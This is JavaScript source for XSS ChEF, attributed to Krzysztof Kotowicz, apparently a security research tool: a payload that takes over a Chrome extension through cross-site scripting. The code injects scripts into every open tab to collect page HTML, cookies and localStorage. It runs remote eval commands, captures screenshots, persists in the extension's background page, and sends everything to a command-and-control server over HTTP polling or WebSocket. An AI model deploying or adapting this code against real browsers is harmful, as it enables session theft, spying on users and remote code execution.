/**
 * @author Krzysztof Kotowicz
 *
 */
/*
todo:
 - chrome.cookies interface
 - link extractor & navigation
 - remove tab
 - let the beef hook work somehow
 - 
*/
function __xsschef() {
    if (window.__xsschef_init) { // prevent double inclusion
        return;
    }
    window.__xsschef_init = true;

    // these scripts gets executed in sheepchannel tab context, they're written here only for syntax highlighting & easy editing
    // START scripts
    var sheepchannel_script = function(msg) {
        /* receive commands from ext and pass the results back */
        switch (msg.cmd) {
            case 'sendhtml':
                var links = [];

                var nodes = document.getElementsByTagName('a');
                for (var i = 0; i < nodes.length; i++) {
                    if (nodes[i].href) {
                        links.push({'href':nodes[i].href, 'title':nodes[i].title, 'html':nodes[i].innerHTML});
                    }
                }                
                __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML, 'links':links}});
            break;
            case 'sendinfo':
                __p.postMessage({cmd:'recvstuff', p: {'cookies':document.cookie, 'localStorage': localStorage}});
            break;
            case 'eval':
                __p.postMessage({cmd:'recveval', p: eval(msg.p)});
            break;
        }
    }
    
    var backchannel_script = function() {
        var url = '__URL__';

        if (url.match(/^http/)) { // http backchannel

            /* receive commands from ext and send the results to c&c */
            __p.onMessage.addListener(function(msg) {
                switch (msg.cmd) {
                    case 'log':
                        var x = new XMLHttpRequest();
                        x.open('POST', url + '?ch=__CHANNEL__', true);
                        x.send(JSON.stringify(msg.p));
                    break;
                }
            });
                
           /* poll for commands from c&c server and send them to ext */
            setInterval(function() {
                var x = new XMLHttpRequest();
                x.open('GET', url + '?ch=__CMD_CHANNEL__', true);
                x.onreadystatechange = function () {
                  if (x.readyState == 4 && x.status == 200) {
                    try {
                        var cmds = JSON.parse(x.responseText);
                        for (var i = 0; i < cmds.length; i++) {
                            // forward command to extension
                            __p.postMessage(cmds[i]);
                        }
                    } catch(e) {}
                  }
                };
                x.send(null);
            }, 2000);

        } else if (url.match(/^ws/)) { // WebSocket based backchannel
            var ws = new WebSocket(url,'chef');
            
            /* receive commands from ext and send the results to c&c */
            __p.onMessage.addListener(function(msg) {
                switch (msg.cmd) {
                    case 'log':
                        ws.send(JSON.stringify({cmd:'post', p: msg.p}));
                    break;
                }
            });

            ws.onmessage = function(e) { // receive commands
                try {
                    var cmds = JSON.parse(e.data);
                    for (var i = 0; i < cmds.length; i++) {
                        // forward command to extension
                        __p.postMessage(cmds[i]);
                    }
                } catch(e) {}
            }
            ws.onopen = function() {
                ws.send(JSON.stringify({cmd:'hello-hook',ch: '__CHANNEL__'}));
            };
        }
        
    }

    
    // END scripts
    
    // todo: make ext the backchannel itself, if permissions allow
    chrome.permissions.contains({
      origins: ['http://*/*']
    }, function(result) {
        if (result) {
            // extension has permissions for XHR on our C&C domain
            // and set a direct log function
        } else {
            // proxy the requests to C&C through backchannel tab
        }
    });

    
    var log = function() {
        if (backchannel) {
            backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
        }
    };

    var backchannel;
    var sheeps = {};
    
    // when tab has been created/updated
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        if (changeInfo.status == 'complete') {
            addSheep(tab);
    
            if (backchannel && backchannel.tab.id == tabId) {
                // backchannel changed, re-establish
                setupBackchannel(tabId, report_tabs);
            } else {
                report_tabs();
            }
        }
    });
    
    // when tab has been removed
    chrome.tabs.onRemoved.addListener(function(tabId, changeInfo) {
        delete sheeps[tabId];
        if (backchannel && backchannel.tab.id == tabId) {
            // backchannel removed, re-establish
            chrome.tabs.getSelected(null, function(t) {
                setupBackchannel(t.id, report_tabs);
            });
        } else {
            report_tabs();
        }
    });
    
    // establish sheepchannel
    var addSheep = function(tab) {
        sheeps[tab.id] = tab;

        try {
            chrome.tabs.executeScript(tab.id, 
                {'code': '(function(){var __p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
            );
        } catch(e) {
            delete sheeps[tab.id];
        }    
    }

    // setup listener from sheeps/backchannel
    chrome.extension.onConnect.addListener(function(port) {
        if (port.name == 'backchannel') {
            backchannel = port;
        } else if (port.name == 'sheepchannel') {
            sheeps[port.tab.id].port = port;
        }
        
        port.onMessage.addListener(function(msg) {
            switch (msg.cmd) {
                case 'recvstuff':
                case 'recveval':
                    log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                break;
                case 'eval':
                    if (msg.id) { // eval in sheep
                        log('eval ' + msg.p + ' in sheep');
                        postToSheep(msg.id, {p: msg.p, cmd: 'eval'});
                    } else { // eval in extension
                        log({type: 'recveval',result: eval(msg.p)});
                    }
                break;
                case 'ping':
                    log({type: 'pong', id: port.tab.id, url: port.tab.url});
                break;
                case 'screenshot':
                    chrome.tabs.captureVisibleTab(null,null, function(data_url) {
                        log({type:'recvscreenshot', url: data_url});
                    });
                break;
                case 'report':
                    report_tabs();
                    report_page_info();
                    report_ext();
                break;
                case 'reporthtml':
                        postToSheep(msg.id, {cmd: 'sendhtml'});
                break;
                case 'createtab':
                    chrome.tabs.create({url: msg.p, active: false});
                break;
                
            }
        });
    });
    
    // setup sheepchannel scripts in all tabs (sheeps)
    chrome.tabs.query({}, function(t2) {
        for (var i=0; i<t2.length;i++) {
            addSheep(t2[i]);
        }
    });    

    var setupBackchannel = function(tabId, oncomplete) {
        chrome.tabs.executeScript(tabId, 
            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});('+backchannel_script.toString()+')();})();'}
                ,function() {setTimeout(oncomplete, 500)});
    }
    
    // setup backchannel port
    chrome.tabs.getSelected(null, function(t) {
        setupBackchannel(t.id, init_complete);
    });
    
    var report_tabs = function() {
        log('reporting tabs');
        chrome.tabs.query({}, function(t) {
            log({type: 'report_tabs','result':t});
        });
    }
    
    var postToSheeps = function(msg) {
        for (var i in sheeps) {
            postToSheep(i,msg);
        }
    }
    
    var postToSheep = function(i,msg) {
        if (sheeps[i].port) {
            sheeps[i].port.postMessage(msg);
        }
    }
    
    var report_page_info = function() {
        postToSheeps({'cmd':'sendinfo'});
    }

    var report_ext = function() {
        chrome.permissions.getAll(function(perm) {
            log({type:'report_ext',result:{'extension': location.href,
                                           'permissions': perm,
                                           'html':document.documentElement.innerHTML,
                                           'cookies':document.cookie,
                                           'localStorage': localStorage}});
        });
    }
    
    var init_complete = function() { // framework ready
        if (window === chrome.extension.getBackgroundPage()) {
            log('persisted in background page :)');
        } else {
            log('no persistence :/');
        }
        log('foothold started');
        report_tabs();
        report_ext();
        if ('__URL__'.match(/^http/)) { // we need to keep the connection alive
            setInterval(function() {
                log('alive');
            }, 20000);
        }
    }
};

if (location.protocol == 'chrome-extension:') { // evaluate only in extension code
    if (chrome.extension.getBackgroundPage()) {// try to persist in background page
        // chrome 18 csp fix - maybe add https:// script to document.body and hope for relaxed CSP policy?
        chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
    } else {
        __xsschef(); // no persistence :(
    }
}
